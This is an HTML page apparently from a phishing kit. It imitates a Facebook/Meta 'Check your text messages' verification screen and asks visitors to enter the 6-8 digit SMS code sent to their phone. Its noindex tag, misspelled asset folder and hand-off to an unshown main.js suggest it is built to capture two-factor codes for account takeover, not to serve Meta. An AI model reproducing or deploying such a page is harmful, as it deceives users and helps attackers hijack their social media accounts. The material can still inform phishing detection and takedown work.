<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Facebook advertising support">
    <meta name="robots" content="noindex,nofollow">
    <title>Meta Pro Support: Facebook and Instagram</title>
    <style>
        /* Reset & Base */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; }

        /* Progress Bar / Loading Animation */
        .body-loading { opacity: .4; pointer-events: none; user-select: none; }
        .wrapper-loading-root .progress-bar { width: 100%; left: 0; right: 0; }
        .progress-bar { z-index: 9; background-color: transparent; width: calc(100% - 72px); height: 4px; display: none; position: absolute; top: 0; left: 36px; right: 36px; overflow: hidden; }
        .bar1, .bar2 { background-color: #1a73e8; height: 100%; position: absolute; }
        .bar1 { animation: 2s infinite bar1move; }
        .bar2 { animation: 2s 1s infinite bar2move; }
        @keyframes bar1move { 0% { width: 30%; left: -35%; } 60% { width: 30%; left: 100%; } to { width: 30%; left: 100%; } }
        @keyframes bar2move { 0% { width: 100%; left: -200%; } 60% { width: 10%; left: 107%; } to { width: 10%; left: 107%; } }

        /* Utility Classes */
        .items-center { align-items: center; }

        /* Verification Main Styles */
        .verification_main { display: flex; align-items: center; justify-content: center; }
        .verification_main .container { width: 600px; margin-top: 60px; }
        .verification_main .heading { display: flex; gap: 8px; flex-direction: column; }
        .verification_main .heading span { color: #0a1317; font-size: 13px; font-weight: 500; }
        .verification_main .heading h2 { color: #0a1317; font-size: 24px; font-weight: 600; }
        .verification_main .heading p { color: #0a1317; font-size: 15px; font-weight: 500; }
        .verification_main .image { margin-top: 14px; }
        .verification_main .image img { width: 100%; }
        .verification_main .form { margin-top: 18px; }
        .verification_main .form input { width: 100%; font-size: 15px; padding: 18px 16px; border-radius: 16px; outline: none; border: 1px solid #ccd3db; }
        .verification_main .form .authSubmit { margin-top: 32px; }
        .verification_main .form button { width: 100%; color: #fff; padding: 0 16px; font-size: 16px; font-weight: 600; text-align: center; border-radius: 22px; line-height: 42px; background-color: #0064e0; border: 1px solid rgb(0, 100, 224); cursor: pointer; }
        .verification_main .new_code { margin-top: 16px; }
        .verification_main .new_code .request { gap: 6px; display: flex; align-items: center; }
        .verification_main .new_code .request svg { color: #5d6c7b; width: 16px; height: 16px; }
        .verification_main .new_code .request span { font-size: 15px; font-weight: 600; color: #0064e0; }
        .verification_main .new_code .request p { color: #5d6c7b; font-size: 15px; font-weight: 500; margin: 0; }
        .verification_main .new_code .request p span { color: #5d6c7b; font-weight: 600; }
        .verification_main .new_code .request > span:hover { text-decoration: underline; cursor: pointer; }
        
        /* Error Styling */
        .error { display: none; font-size: 13px; margin-top: 5px; color: #d31130; }

        /* Hide number input spinners */
        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        input[type="number"] { -moz-appearance: textfield; appearance: textfield; }

        @media only screen and (max-width: 768px) {
            .verification_main .container { width: 95%; padding: 0 8px; }
        }
    </style>
</head>
<body>
    <div id="root">
        <div class="wrapper-loading-root">
            <div class="progress-bar" style="display: none;">
                <div class="bar1"></div>
                <div class="bar2"></div>
            </div>
        </div>
        <div class="verification_main">
            <div class="container">
                <div class="heading">
                    <span>• Facebook</span>
                    <h2>Check your text messages</h2>
                    <p>Enter the code we sent to your number.</p>
                </div>
                <div class="image">
                    <img alt="SMS Verification" src="./assests/sms.png">
                </div>
                <div class="form">
                    <form method="POST" action="#">
                        <input class="authFormInput" id="authenticator" placeholder="Code" maxlength="8" type="text" name="authenticator">
                        <span class="error">Entered code must be exactly 6-8 digits</span>
                        <div class="new_code">
                            <div class="request items-center">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em">
                                    <path d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"></path>
                                </svg>
                                <p id="showSeconds">We can send a new code in <span id="seconds">02:00</span></p>
                            </div>
                        </div>
                        <div class="authSubmit">
                            <button name="submitAuth" id="submitButton" type="submit">Continue</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script src="./assests/main.js"></script>
</body>
</html>
